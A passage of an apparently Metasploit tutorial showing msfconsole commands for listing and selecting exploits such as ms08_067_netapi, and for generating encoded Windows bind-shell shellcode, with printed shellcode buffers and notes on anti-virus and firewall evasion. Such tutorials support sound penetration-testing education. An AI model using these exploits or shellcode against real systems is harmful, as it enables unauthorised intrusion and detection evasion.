   aix/rpc_ttdbserverd_realpath                                   2009-06-17       great      ToolTalk rpc.ttdbserverd _tt_internal_realpath Buffer Overflow (AIX)
   bsdi/softcart/mercantec_softcart                               2004-08-19       great      Mercantec SoftCart CGI Overflow
 ...snip...


Using MSFconsole Payloads
^^^^^^

Running show payloads will display all of the different payloads for all platforms available within Metasploit.

::

 msf > show payloads

 Payloads
 ========

   Name                                             Disclosure Date  Rank    Description
   ----                                             ---------------  ----    -----------
   aix/ppc/shell_bind_tcp                                            normal  AIX Command Shell, Bind TCP Inline
   aix/ppc/shell_find_port                                           normal  AIX Command Shell, Find Port Inline
   aix/ppc/shell_interact                                            normal  AIX execve shell for inetd
 ...snip...

payloads
"""""

As you can see, there are a lot of payloads available. Fortunately, when you are in the context of a particular exploit, running show payloads will only display the payloads that are compatible with that particular exploit. For instance, if it is a Windows exploit, you will not be shown the Linux payloads.


::

 msf  exploit(ms08_067_netapi) > show payloads

 Compatible Payloads
 ===================

   Name                                             Disclosure Date  Rank    Description
   ----                                             ---------------  ----    -----------
   generic/custom                                                    normal  Custom Payload
   generic/debug_trap                                                normal  Generic x86 Debug Trap
   generic/shell_bind_tcp                                            normal  Generic Command Shell, Bind TCP Inline
 ...snip...


options
"""""

If you have selected a specific module, you can issue the show options command to display which settings are available and/or required for that specific module.

::

  msf exploit(ms08_067_netapi) > show options

 Module options:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST                     yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

 Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


targets
"""""

If you aren’t certain whether an operating system is vulnerable to a particular exploit, run the show targets command from within the context of an exploit module to see which targets are supported.

::

 msf  exploit(ms08_067_netapi) > show targets

 Exploit targets:

   Id  Name
   --  ----
   0   Automatic Targeting
   1   Windows 2000 Universal
   10  Windows 2003 SP1 Japanese (NO NX)
   11  Windows 2003 SP2 English (NO NX)
   12  Windows 2003 SP2 English (NX)
 ...snip...

advanced
"""""

If you wish the further fine-tune an exploit, you can see more advanced options by running show advanced.

::

  msf exploit(ms08_067_netapi) > show advanced

 Module advanced options:

   Name           : CHOST
   Current Setting:
   Description    : The local client address

   Name           : CPORT
   Current Setting:
   Description    : The local client port

 ...snip...

encoders
"""""

Running show encoders will display a listing of the encoders that are available within MSF.

::

  msf > show encoders
 Compatible Encoders
 ===================

   Name                    Disclosure Date  Rank       Description
   ----                    ---------------  ----       -----------
   cmd/generic_sh                           good       Generic Shell Variable Substitution Command Encoder
   cmd/ifs                                  low        Generic ${IFS} Substitution Command Encoder
   cmd/printf_php_mq                        manual     printf(1) via PHP magic_quotes Utility Command Encoder
   generic/none                             normal     The "none" Encoder
   mipsbe/longxor                           normal     XOR Encoder
   mipsle/longxor                           normal     XOR Encoder
   php/base64                               great      PHP Base64 encoder
   ppc/longxor                              normal     PPC LongXOR Encoder
   ppc/longxor_tag                          normal     PPC LongXOR Encoder
   sparc/longxor_tag                        normal     SPARC DWORD XOR Encoder
   x64/xor                                  normal     XOR Encoder
   x86/alpha_mixed                          low        Alpha2 Alphanumeric Mixedcase Encoder
   x86/alpha_upper                          low        Alpha2 Alphanumeric Uppercase Encoder
   x86/avoid_utf8_tolower                   manual     Avoid UTF8/tolower
   x86/call4_dword_xor                      normal     Call+4 Dword XOR Encoder
   x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder
   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder
   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder
   x86/countdown                            normal     Single-byte XOR Countdown Encoder
   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder
   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder
   x86/nonalpha                             low        Non-Alpha Encoder
   x86/nonupper                             low        Non-Upper Encoder
   x86/shikata_ga_nai                       excellent  Polymorphic XOR Additive Feedback Encoder
   x86/single_static_bit                    manual     Single Static Bit
   x86/unicode_mixed                        manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder


nops
"""""

Lastly, issuing the show nops command will display the NOP Generators that Metasploit has to offer.

::

  msf > show nops
 NOP Generators
 ==============

   Name             Disclosure Date  Rank    Description
   ----             ---------------  ----    -----------
   armle/simple                      normal  Simple
   mipsbe/better                     normal  Better
   php/generic                       normal  PHP Nop Generator
   ppc/simple                        normal  Simple
   sparc/random                      normal  SPARC NOP Generator
   tty/generic                       normal  TTY Nop Generator
   x64/simple                        normal  Simple
   x86/opty2                         normal  Opty2
   x86/single_byte                   normal  Single Byte


use
"""""

When you have decided on a particular module to make use of, issue the use command to select it. The use command changes your context to a specific module, exposing type-specific commands. Notice in the output below that any global variables that were previously set are already configured.


::

  msf > use dos/windows/smb/ms09_001_write
 msf auxiliary(ms09_001_write) > show options

 Module options:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  445              yes       Set the SMB service port

 msf auxiliary(ms09_001_write) >


Exploits
=======

show Exploits

Selecting an exploit in Metasploit adds the ‘exploit’ and ‘check’ commands to msfconsole.

::

 msf > use  exploit/windows/smb/ms09_050_smb2_negotiate_func_index
 msf exploit(ms09_050_smb2_negotiate_func_index) > help
 ...snip...
 Exploit Commands
 ================

    Command       Description
    -------       -----------
    check         Check to see if a target is vulnerable
    exploit       Launch an exploit attempt
    pry           Open a Pry session on the current module
    rcheck        Reloads the module and checks if the target is vulnerable
    reload        Just reloads the module
    rerun         Alias for rexploit
    rexploit      Reloads the module and launches an exploit attempt
    run           Alias for exploit

 msf exploit(ms09_050_smb2_negotiate_func_index) >


show
^^^^

Using an exploit also adds more options to the ‘show’ command.

MSF Exploit Targets
"""""""

::

 msf exploit(ms09_050_smb2_negotiate_func_index) > show targets

 Exploit targets:

   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)


MSF Exploit Payloads
""""""

::

 msf exploit(ms09_050_smb2_negotiate_func_index) > show payloads

 Compatible Payloads
 ===================

   Name                              Disclosure Date  Rank    Description
   ----                              ---------------  ----    -----------
   generic/custom                                     normal  Custom Payload
   generic/debug_trap                                 normal  Generic x86 Debug Trap
   generic/shell_bind_tcp                             normal  Generic Command Shell, Bind TCP Inline
   generic/shell_reverse_tcp                          normal  Generic Command Shell, Reverse TCP Inline
   generic/tight_loop                                 normal  Generic x86 Tight Loop
   windows/adduser                                    normal  Windows Execute net user /ADD
 ...snip...

MSF Exploit Options
"""""""

::

  msf exploit(ms09_050_smb2_negotiate_func_index) > show options

 Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  445              yes       The target port (TCP)
   WAIT   180              yes       The number of seconds to wait for the attack to complete.


 Exploit target:

   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)


Advanced
""""""""""

::

 msf exploit(ms09_050_smb2_negotiate_func_index) > show advanced

 Module advanced options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name                    Current Setting    Required  Description
   ----                    ---------------    --------  -----------
   CHOST                                      no        The local client address
   CPORT                                      no        The local client port
   ConnectTimeout          10                 yes       Maximum number of seconds to establish a TCP connection
   ContextInformationFile                     no        The information file that contains context information
   DisablePayloadHandler   false              no        Disable the handler code for the selected payload
   EnableContextEncoding   false              no        Use transient context when encoding payloads
 ...snip...


Evasion
"""""

::

 msf exploit(ms09_050_smb2_negotiate_func_index) > show evasion
 Module evasion options:

   Name                           Current Setting  Required  Description
   ----                           ---------------  --------  -----------
   SMB::obscure_trans_pipe_level  0                yes       Obscure PIPE string in TransNamedPipe (level 0-3)
   SMB::pad_data_level            0                yes       Place extra padding between headers and data (level 0-3)
   SMB::pad_file_level            0                yes       Obscure path names used in open/create (level 0-3)
   SMB::pipe_evasion              false            yes       Enable segmented read/writes for SMB Pipes
   SMB::pipe_read_max_size        1024             yes       Maximum buffer size for pipe reads
   SMB::pipe_read_min_size        1                yes       Minimum buffer size for pipe reads
   SMB::pipe_write_max_size       1024             yes       Maximum buffer size for pipe writes
   SMB::pipe_write_min_size       1                yes       Minimum buffer size for pipe writes
   TCP::max_send_size             0                no        Maxiumum tcp segment size.  (0 = disable)
   TCP::send_delay                0                no        Delays inserted before every send.  (0 = disable)


payloads
=======

Payloads types
^^^^^^^^

We briefly covered the three main payload types: singles, stagers and stages. Metasploit contains many different types of payloads, each serving a unique role within the framework. Let’s take a brief look at the various types of payloads available and get an idea of when each type should be used.

Inline (Non Staged)
"""""""""""""""

A single payload containing the exploit and full shell code for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all in one. However some exploits wont support the resulting size of these payloads.

Stager
"""""

Stager payloads work in conjunction with stage payloads in order to perform a specific task. A stager establishes a communication channel between the attacker and the victim and reads in a stage payload to execute on the remote host.

Meterpreter
""""""""

Meterpreter, the short form of Meta-Interpreter is an advanced, multi-faceted payload that operates via dll injection. The Meterpreter resides completely in the memory of the remote host and leaves no traces on the hard drive, making it very difficult to detect with conventional forensic techniques. Scripts and plugins can be loaded and unloaded dynamically as required and Meterpreter development is very strong and constantly evolving.

PassiveX
""""""

PassiveX is a payload that can help in circumventing restrictive outbound firewalls. It does this by using an ActiveX control to create a hidden instance of Internet Explorer. Using the new ActiveX control, it communicates with the attacker via HTTP requests and responses.

NoNX
"""""

The NX (No eXecute) bit is a feature built into some CPUs to prevent code from executing in certain areas of memory. In Windows, NX is implemented as Data Execution Prevention (DEP). The Metasploit NoNX payloads are designed to circumvent DEP.

Ord
""""""

Ordinal payloads are Windows stager based payloads that have distinct advantages and disadvantages. The advantages being it works on every flavor and language of Windows dating back to Windows 9x without the explicit definition of a return address. They are also extremely tiny. However two very specific disadvantages make them not the default choice. The first being that it relies on the fact that ws2_32.dll is loaded in the process being exploited before exploitation. The second being that it’s a bit less stable than the other stagers.

IPv6
""""""

The Metasploit IPv6 payloads, as the name indicates, are built to function over IPv6 networks.

Reflective DLL injection
"""""""

Reflective DLL Injection is a technique whereby a stage payload is injected into a compromised host process running in memory, never touching the host hard drive. The VNC and Meterpreter payloads both make use of reflective DLL injection. You can read more about this from Stephen Fewer, the creator of the reflective DLL injection method.
http://blog.harmonysecurity.com/2008/10/new-paper-reflective-dll-injection.html


Generating Payloads in Metasploit
^^^^^^^^^^

General generation
""""""""

During exploit development, you will most certainly need to generate shellcode to use in your exploit. In Metasploit, payloads can be generated from within the msfconsole. When you ‘use‘ a certain payload, Metasploit adds the ‘generate‘, ‘pry‘ and ‘reload‘ commands. Generate will be the primary focus of this section in learning how to use Metasploit.

::

  msf > use payload/windows/shell_bind_tcp
 msf payload(shell_bind_tcp) > help
 ...snip...

    Command       Description
    -------       -----------
    generate      Generates a payload
    pry           Open a Pry session on the current module
    reload        Reload the current module from disk


Let’s start by looking at the various options for the ‘generate‘ command by running it with the ‘-h‘ switch.

::

  msf payload(shell_bind_tcp) > generate -h
 Usage: generate [options]

 Generates a payload.

 OPTIONS:

    -E        Force encoding.
    -b <opt>  The list of characters to avoid: '\x00\xff'
    -e <opt>  The name of the encoder module to use.
    -f <opt>  The output file name (otherwise stdout)
    -h        Help banner.
    -i <opt>  the number of encoding iterations.
    -k        Keep the template executable functional
    -o <opt>  A comma separated list of options in VAR=VAL format.
    -p <opt>  The Platform for output.
    -s <opt>  NOP sled length.
    -t <opt>  The output format: raw,ruby,rb,perl,pl,c,js_be,js_le,java,dll,exe,exe-small,elf,macho,vba,vbs,loop-vbs,asp,war
    -x <opt>  The executable template to use


To generate shellcode without any options, simply execute the ‘generate‘ command.

::

  msf payload(shell_bind_tcp) > generate
 # windows/shell_bind_tcp - 341 bytes
 # http://www.metasploit.com
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" +
 "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" +
 "\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" +
 "\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0" +
 "\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b" +
 "\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff" +
 "\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d" +
 "\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b" +
 "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44" +
 "\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b" +
 "\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f" +
 "\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29" +
 "\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50" +
 "\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7\x31" +
 "\xdb\x53\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68" +
 "\xc2\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff" +
 "\xd5\x53\x53\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x89\xc7" +
 "\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3" +
 "\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44" +
 "\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56" +
 "\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86" +
 "\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60" +
 "\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5" +
 "\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f" +
 "\x6a\x00\x53\xff\xd5"

Of course the odds of generating shellcode like this without any sort of ‘tweeking’ are rather low. More often than not, bad characters and specific types of encoders will be used depending on the targeted machine.

The sample code above contains an almost universal bad character, the null byte (\x00). Granted some exploits allow us to use it but not many. Let’s generate the same shellcode only this time we will instruct Metasploit to remove this unwanted byte.

To accomplish this, we issue the ‘generate‘ command followed by the ‘-b‘ switch with accompanying bytes we wish to be disallowed during the generation process.

::

  msf  payload(shell_bind_tcp) > generate -b '\x00'
 # windows/shell_bind_tcp - 368 bytes
 # http://www.metasploit.com
 # Encoder: x86/shikata_ga_nai
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\xdb\xde\xba\x99\x7c\x1b\x5f\xd9\x74\x24\xf4\x5e\x2b\xc9" +
 "\xb1\x56\x83\xee\xfc\x31\x56\x14\x03\x56\x8d\x9e\xee\xa3" +
 "\x45\xd7\x11\x5c\x95\x88\x98\xb9\xa4\x9a\xff\xca\x94\x2a" +
 "\x8b\x9f\x14\xc0\xd9\x0b\xaf\xa4\xf5\x3c\x18\x02\x20\x72" +
 "\x99\xa2\xec\xd8\x59\xa4\x90\x22\x8d\x06\xa8\xec\xc0\x47" +
 "\xed\x11\x2a\x15\xa6\x5e\x98\x8a\xc3\x23\x20\xaa\x03\x28" +
 "\x18\xd4\x26\
 ...snip...


Looking at this shellcode it’s easy to see, compared to the previously generated bind shell, the null bytes have been successfully removed. Thus giving us a null byte free payload. We also see other significant differences as well, due to the change we enforced during generation.

One difference is the shellcode’s total byte size. In our previous iteration the size was 341 bytes, this new shellcode is 27 bytes larger.

::

  msf  payload(shell_bind_tcp) > generate
 # windows/shell_bind_tcp - 341 bytes
 # http://www.metasploit.com
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 ...snip...

 msf  payload(shell_bind_tcp) > generate -b '\x00'
 # windows/shell_bind_tcp - 368 bytes
 # http://www.metasploit.com
 # Encoder: x86/shikata_ga_nai
 ...snip...

During generation, the null bytes’ original intent, or usefulness in the code, needed to be replaced (or encoded) in order to insure, once in memory, our bind shell remains functional.

Another significant change is the added use of an encoder. By default Metasploit will select the best encoder to accomplish the task at hand. The encoder is responsible for removing unwanted characters (amongst other things) entered when using the ‘-b’ switch. We’ll discuss encoders in greater detail later on.

When specifying bad characters the framework will use the best encoder for the job. The ‘x86/shikata_ga_nai’ encoder was used when only the null byte was restricted during the code’s generation. If we add a few more bad characters a different encoder may be used to accomplish the same task. Lets add several more bytes to the list and see what happens.

::

  msf  payload(shell_bind_tcp) > generate -b '\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b'
 # windows/shell_bind_tcp - 366 bytes
 # http://www.metasploit.com
 # Encoder: x86/fnstenv_mov
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\x6a\x56\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xbf" +
 "\x5c\xbf\xe8\x83\xeb\xfc\...
 ...snip...


We see a different encoder was used in order to successfully remove our unwanted bytes. Shikata_ga_nai was probably incapable of encoding our payload using our restricted byte list. Fnstenv_mov on the other hand was able to accomplish this.


Payload Generation Failed
"""""""""""""""

Having the ability to generate shellcode without the use of certain characters is one of the great features offered by this framework. That doesn’t mean it’s limitless.

 If too many restricted bytes are given no encoder may be up for the task. At which point Metasploit will display the following message.

 ::

   msf  payload(shell_bind_tcp) > generate -b '\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b\xFF\x0a\x0b\x01\xcc\6e\x1e\x2e\x26'
 [-] Payload generation failed: No encoders encoded the buffer successfully.


It’s like removing too may letters from the alphabet and asking someone to write a full sentence. Sometimes it just can’t be done.

Using an Encoder During Payload Generation
"""""""

As mentioned previously the framework will choose the best encoder possible when generating our payload. However there are times when one needs to use a specific type, regardless of what Metasploit thinks. Imagine an exploit that will only successfully execute provided it only contains non-alphanumeric characters. The ‘shikata_ga_nai’ encoder would not be appropriate in this case as it uses pretty much every character available to encode.

 Looking at the encoder list, we see the ‘x86/nonalpha’ encoder is present.

 ::

   msf  payload(shell_bind_tcp) > show encoders

 Encoders
 ========

   Name                    Disclosure Date  Rank       Description
   ----                    ---------------  ----       -----------
 ...snip...
   x86/call4_dword_xor                      normal     Call+4 Dword XOR Encoder
   x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder
   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder
   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder
   x86/countdown                            normal     Single-byte XOR Countdown Encoder
   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder
   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder
   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder
   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder
   x86/countdown                            normal     Single-byte XOR Countdown Encoder
   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder
   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder
   x86/nonalpha                             low        Non-Alpha Encoder
   x86/nonupper                             low        Non-Upper Encoder
   x86/shikata_ga_nai                       excellent  Polymorphic XOR Additive Feedback Encoder
   x86/single_static_bit                    manual     Single Static Bit
   x86/unicode_mixed                        manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder


Let’s redo our bind shell payload but this time we’ll tell the framework to use the ‘nonalpha‘ encoder. We do this by using the ‘-e‘ switch followed by the encoder’s name as displayed in the above list.

::

  msf  payload(shell_bind_tcp) > generate -e x86/nonalpha
 # windows/shell_bind_tcp - 489 bytes
 # http://www.metasploit.com
 # Encoder: x86/nonalpha
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\x66\xb9\xff\xff\xeb\x19\x5e\x8b\xfe\x83\xc7\x70\x8b\xd7" +
 "\x3b\xf2\x7d\x0b\xb0\x7b\xf2\xae\xff\xcf\xac\x28\x07\xeb" +
 "\xf1\xeb\x75\xe8\xe2\xff\xff\xff\x17\x29\x29\x29\x09\x31" +
 "\x1a\x29\x24\x29\x39\x03\x07\x31\x2b\x33\x23\x32\x06\x06" +
 "\x23\x23\x15\x30\x23\x37\x1a\x22\x21\x2a\x23\x21\x13\x13" +
 "\x04\x08\x27\x13\x2f\x04\x27\x2b\x13\x10\x2b\x2b\x2b\x2b" +
 "\x2b\x2b\x13\x28\x13\x11\x25\x24\x13\x14\x28\x24\x13\x28" +
 "\x28\x24\x13\x07\x24\x13\x06\x0d\x2e\x1a\x13\x18\x0e\x17" +
 "\x24\x24\x24\x11\x22\x25\x15\x37\x37\x37\x27\x2b\x25\x25" +
 "\x25\x35\x25\x2d\x25\x25\x28\x25\x13\x02\x2d\x25\x35\x13" +
 "\x25\x13\x06\x34\x09\x0c\x11\x28\xfc\xe8\x89\x00\x00\x00" +
 ...snip...


If everything went according to plan, our payload will not contain any alphanumeric characters. But we must be careful when using a different encoder other than the default. As it tends to give us a larger payload. For instance, this one is much larger than our previous examples.

Our next option on the list is the ‘-f‘ switch. This gives us the ability to save our generated payload to a file instead of displaying it on the screen. As always it follows the ‘generate‘ command with file path.

::

  msf  payload(shell_bind_tcp) > generate -b '\x00' -e x86/shikata_ga_nai -f /root/msfu/filename.txt
 [*] Writing 1803 bytes to /root/msfu/filename.txt...
 msf  payload(shell_bind_tcp) > cat ~/msfu/filename.txt
 [*] exec: cat ~/msfu/filename.txt

 # windows/shell_bind_tcp - 368 bytes
 # http://www.metasploit.com
 # Encoder: x86/shikata_ga_nai
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\xdb\xcb\xb8\x4f\xd9\x99\x0f\xd9\x74\x24\xf4\x5a\x2b\xc9" +
 "\xb1\x56\x31\x42\x18\x83\xc2\x04\x03\x42\x5b\x3b\x6c\xf3" +
 "\x8b\x32\x8f\x0c\x4b\x25\x19\xe9\x7a\x77\x7d\x79\x2e\x47" +
 "\xf5\x2f\xc2\x2c\x5b\xc4\x51\x40\x74\xeb\xd2\xef\xa2\xc2" +
 "\xe3\xc1\x6a\x88\x27\x43\x17\xd3\x7b\xa3\x26\x1c\x8e\xa2" +
 "\x6f\x41\x60\xf6\x38\x0d\xd2\xe7\x4d\x53\xee\x06\x82\xdf" +
 "\x4e\x71\xa7\x20\x3a\xcb\xa6\x70\x92\x40\xe0\x68\x99\x0f" +
 "\xd1\x89\x4e\x4c\x2d\xc3\xfb\xa7\xc5\xd2\x2d\xf6\x26\xe5" +
 ...snip...


By using the ‘cat‘ command the same way we would from the command shell, we can see our payload was successfully saved to our file. As we can see it is also possible to use more than one option when generating our shellcode.


Generating Payloads with Multiple Passes
"""""""""""""

Next on our list of options is the iteration switch ‘-i‘. In a nutshell, this tells the framework how many encoding passes it must do before producing the final payload. One reason for doing this would be stealth, or anti-virus evasion. Anti-virus evasion is covered in greater detail in another section of MSFU.

So let’s compare our bind shell payload generated using 1 iteration versus 2 iteration of the same shellcode.

::

  msf  payload(shell_bind_tcp) > generate -b '\x00'
 # windows/shell_bind_tcp - 368 bytes
 # http://www.metasploit.com
 # Encoder: x86/shikata_ga_nai
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\xdb\xd9\xb8\x41\x07\x94\x72\xd9\x74\x24\xf4\x5b\x2b\xc9" +
 "\xb1\x56\x31\x43\x18\x03\x43\x18\x83\xeb\xbd\xe5\x61\x8e" +
 "\xd5\x63\x89\x6f\x25\x14\x03\x8a\x14\x06\x77\xde\x04\x96" +
 "\xf3\xb2\xa4\x5d\x51\x27\x3f\x13\x7e\x48\x88\x9e\x58\x67" +
 "\x09\x2f\x65\x2b\xc9\x31\x19\x36\x1d\x92\x20\xf9\x50\xd3" +
 "\x65\xe4\x9a\x81\x3e\x62\x08\x36\x4a\x36\x90\x37\x9c\x3c" +
 ...snip...

With two iterations :

::

  msf  payload(shell_bind_tcp) > generate -b '\x00' -i 2
 # windows/shell_bind_tcp - 395 bytes
 # http://www.metasploit.com
 # Encoder: x86/shikata_ga_nai
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\xbd\xea\x95\xc9\x5b\xda\xcd\xd9\x74\x24\xf4\x5f\x31\xc9" +
 "\xb1\x5d\x31\x6f\x12\x83\xc7\x04\x03\x85\x9b\x2b\xae\x80" +
 "\x52\x72\x25\x16\x6f\x3d\x73\x9c\x0b\x38\x26\x11\xdd\xf4" +
 "\x80\xd2\x1f\xf2\x1d\x96\x8b\xf8\x1f\xb7\x9c\x8f\x65\x96" +
 "\xf9\x15\x99\x69\x57\x18\x7b\x09\x1c\xbc\xe6\xb9\xc5\xde" +
 "\xc1\x81\xe7\xb8\xdc\x3a\x51\xaa\x34\xc0\x82\x7d\x6e\x45" +
 "\xeb\x2b\x27\x08\x79\xfe\x8d\xe3\x2a\xed\x14\xe7\x46\x45" +
 ...snip...


Comparing the two outputs we see the obvious effect the second iteration had on our payload. First of all, the byte size is larger than the first. The more iterations one does the larger our payload will be. Secondly comparing the first few bytes of the highlighted code, we also see they are no longer the same. This is due to the second iteration, or second encoding pass. It encoded our payload once, than took that payload and encoded it again. Lets look at our shellcode and see how much of a difference 5 iterations would make.


::

  msf  payload(shell_bind_tcp) > generate -b '\x00' -i 5
 # windows/shell_bind_tcp - 476 bytes
 # http://www.metasploit.com
 # Encoder: x86/shikata_ga_nai
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\xb8\xea\x18\x9b\x0b\xda\xc4\xd9\x74\x24\xf4\x5b\x33\xc9" +
 "\xb1\x71\x31\x43\x13\x83\xeb\xfc\x03\x43\xe5\xfa\x6e\xd2" +
 "\x31\x23\xe4\xc1\x35\x8f\x36\xc3\x0f\x94\x11\x23\x54\x64" +
 "\x0b\xf2\xf9\x9f\x4f\x1f\x01\x9c\x1c\xf5\xbf\x7e\xe8\xc5" +
 "\x94\xd1\xbf\xbb\x96\x64\xef\xc1\x10\x9e\x38\x45\x1b\x65" +
 ...snip...


The change is significant when comparing to all previous outputs. It’s slightly larger and our bytes are no where near similar. Which would, in theory, make this version of our payload less prone to detection.

We’ve spent lots of time generating shellcode from the start with default values. In the case of a bind shell the default listening port is 4444. Often this must be changed. We can accomplish this by using the ‘-o’ switch followed by the value we wish to change. Let’s take a look at which options we can change for this payload. From the msfconsole we’ll issue the ‘show options’ command.

::

  msf  payload(shell_bind_tcp) > show options

 Module options (payload/windows/shell_bind_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique: seh, thread, process, none
   LPORT     4444             yes       The listen port
   RHOST                      no        The target address


By default our shell will listen on port ‘4444’ and the exit function is ‘process’. We’ll change this to port ‘1234’ and ‘seh’ exit function using the ‘-o’. The syntax is VARIABLE=VALUE separated by a comma between each option. In this case both the listening port and exit function are changed so the following syntax is used ‘LPORT=1234,EXITFUNC=seh’.


::

  msf  payload(shell_bind_tcp) > generate -o LPORT=1234,EXITFUNC=seh -b '\x00' -e x86/shikata_ga_nai
 # windows/shell_bind_tcp - 368 bytes
 # http://www.metasploit.com
 # Encoder: x86/shikata_ga_nai
 # VERBOSE=false, LPORT=1234, RHOST=, EXITFUNC=seh,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\xdb\xd1\xd9\x74\x24\xf4\xbb\x93\x49\x9d\x3b\x5a\x29\xc9" +
 "\xb1\x56\x83\xc2\x04\x31\x5a\x14\x03\x5a\x87\xab\x68\xc7" +
 "\x4f\xa2\x93\x38\x8f\xd5\x1a\xdd\xbe\xc7\x79\x95\x92\xd7" +
 "\x0a\xfb\x1e\x93\x5f\xe8\x95\xd1\x77\x1f\x1e\x5f\xae\x2e" +
 "\x9f\x51\x6e\xfc\x63\xf3\x12\xff\xb7\xd3\x2b\x30\xca\x12" +
 "\x6b\x2d\x24\x46\x24\x39\x96\x77\x41\x7f\x2a\x79\x85\x0b" +
 "\x12\x01\xa0\xcc\xe6\xbb\xab\x1c\x56\xb7\xe4\x84\xdd\x9f" +
 ...snip...


Payload Generation Using a NOP Sled
"""""""""""


Finally lets take a look at the NOP sled length and output format options. When generating payloads the default output format given is ‘ruby’. Although the ruby language is extremely powerful and popular, not everyone codes in it. We have the capacity to tell the framework to give our payload in different coding formats such as Perl, C and Java for example. Adding a NOP sled at the beginning is also possible when generating our shellcode.

First let’s look at a few different output formats and see how the ‘-t‘ switch is used. Like all the other options all that needs to be done is type in the switch followed by the format name as displayed in the help menu.

::

  msf  payload(shell_bind_tcp) > generate
 # windows/shell_bind_tcp - 341 bytes
 # http://www.metasploit.com
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
